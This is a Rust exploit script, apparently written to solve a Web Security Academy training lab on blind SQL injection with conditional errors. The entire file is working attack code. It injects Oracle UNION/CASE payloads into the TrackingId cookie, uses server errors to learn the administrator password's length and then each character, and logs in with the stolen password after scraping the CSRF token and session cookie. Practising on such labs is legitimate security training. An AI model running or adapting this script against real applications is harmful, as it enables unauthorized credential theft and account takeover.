/******************************************************************************
*
* Lab: Blind SQL injection with conditional errors
*
* Hack Steps:
*      1. Inject payload into 'TrackingId' cookie to determine the length of
*         administrator's password based on conditional errors
*      2. Modify the payload to brute force the administrator's password
*      3. Fetch the login page
*      4. Extract the csrf token and session cookie
*      5. Login as the administrator
*      6. Fetch the administrator profile
*
*******************************************************************************/
use lazy_static::lazy_static;
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
    Error,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    process,
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a4d003e0481738c8623e9e800a9009c.web-security-academy.net";

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    println!("⦗#⦘ Injection point: {}", "TrackingId".yellow(),);
    println!("⦗1⦘ Determining password length.. ");

    let password_length = determine_password_length();

    println!("⦗2⦘ Brute forcing password.. ");

    let admin_password = brute_force_password(password_length);

    print!("\n⦗3⦘ Fetching the login page.. ");
    flush_terminal();

    let login_page = fetch("/login");

    println!("{}", "OK".green());
    print!("⦗4⦘ Extracting the csrf token and session cookie.. ");
    flush_terminal();

    let session = get_session_from_multiple_cookies(&login_page);
    let csrf_token = get_csrf_token(login_page);

    println!("{}", "OK".green());
    print!("⦗5⦘ Logging in as the administrator.. ");
    flush_terminal();

    let login_as_admin = login_as_admin(&admin_password, &session, &csrf_token);

    println!("{}", "OK".green());
    print!("⦗6⦘ Fetching the administrator profile.. ");

    let admin_session = get_session_cookie(&login_as_admin);
    flush_terminal();

    fetch_with_cookie("/my-account", "session", &admin_session).unwrap();

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn determine_password_length() -> usize {
    for length in 1..50 {
        print!("\r❯❯ Checking if length = {}", length.to_string().yellow());
        flush_terminal();

        let payload = format!("' UNION SELECT CASE WHEN (length((select password from users where username = 'administrator')) = {length}) THEN TO_CHAR(1/0) ELSE NULL END FROM dual-- -");

        if let Ok(response) = fetch_with_cookie("/filter?category=Pets", "TrackingId", &payload) {
            if response.status().as_u16() == 500 {
                println!(" [ Correct length: {} ]", length.to_string().green());

                return length;
            } else {
                continue;
            }
        } else {
            continue;
        }
    }

    println!("{}", "⦗!⦘ Failed to determine the password length");
    process::exit(1);
}

fn brute_force_password(password_length: usize) -> String {
    let mut correct_password = String::new();

    for position in 1..=password_length {
        for character in "0123456789abcdefghijklmnopqrstuvwxyz".chars() {
            print!(
                "\r❯❯ Checking if char at position {} =  {}",
                position.to_string().blue(),
                character.to_string().yellow()
            );
            flush_terminal();

            let payload = format!(
                "' UNION SELECT CASE WHEN (substr((select password from users where username = 'administrator'), {position}, 1) = '{character}') THEN TO_CHAR(1/0) ELSE NULL END FROM dual-- -",
            );
            if let Ok(response) = fetch_with_cookie("/filter?category=Pets", "TrackingId", &payload)
            {
                if response.status().as_u16() == 500 {
                    correct_password.push(character);

                    print!(" [ Correct password: {} ]", correct_password.green());

                    break;
                } else {
                    continue;
                }
            } else {
                continue;
            }
        }
    }

    return correct_password;
}

fn fetch(path: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn fetch_with_cookie(path: &str, cookie_name: &str, cookie_value: &str) -> Result<Response, Error> {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .header("Cookie", format!("{cookie_name}={cookie_value}"))
        .send()
}

fn login_as_admin(admin_password: &str, session: &str, csrf_token: &str) -> Response {
    WEB_CLIENT
        .post(format!("{LAB_URL}/login"))
        .form(&HashMap::from([
            ("username", "administrator"),
            ("password", &admin_password),
            ("csrf", &csrf_token),
        ]))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to login as the administrator".red()
        ))
}

fn get_csrf_token(response: Response) -> String {
    let document = Document::from(response.text().unwrap().as_str());
    document
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
        .expect(&format!("{}", "⦗!⦘ Failed to get the csrf".red()))
        .to_string()
}

fn get_session_from_multiple_cookies(response: &Response) -> String {
    let headers = response.headers();
    let mut all_cookies = headers.get_all("set-cookie").iter();
    let session_cookie = all_cookies.nth(1).unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*); Secure", session_cookie)
}

fn get_session_cookie(response: &Response) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*); Secure", cookie_header)
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
